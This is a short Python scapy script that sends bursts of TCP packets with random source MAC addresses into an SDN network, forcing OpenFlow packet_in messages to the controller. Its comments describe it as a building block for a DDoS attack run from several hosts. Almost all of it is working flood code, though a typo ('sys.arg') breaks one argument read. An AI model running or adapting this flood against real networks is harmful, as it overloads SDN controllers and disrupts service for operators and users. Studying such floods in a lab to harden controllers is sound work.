
#! /usr/bin/env python
# Script to send packets with different mac addresses  to the SDN network 
# It forces the switch to send an Openflow packet_in to the controller
# It can be used in several hosts to create a DDoS attack
# It must run on a host connected to a switch in the SDN network 
import scapy.all as scapy
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
import sys


def pingen(qp,ifa):
    for i in range(qp):
        oc=(i*2)
        packet =Ether(dst=hServerMAC,src=randMAC())/IP(src='10.0.0.'+str(oc),
            dst=hServerIP)/TCP()/payload
        sendp(packet, count=100,iface=ifa)

hServerMAC=sys.argv[1]
hServerIP=sys.arg[2]
payload = 'PAYLOAD_OF_THE_PACKET_12345467890'
pingen(10,'hClient-eth0')
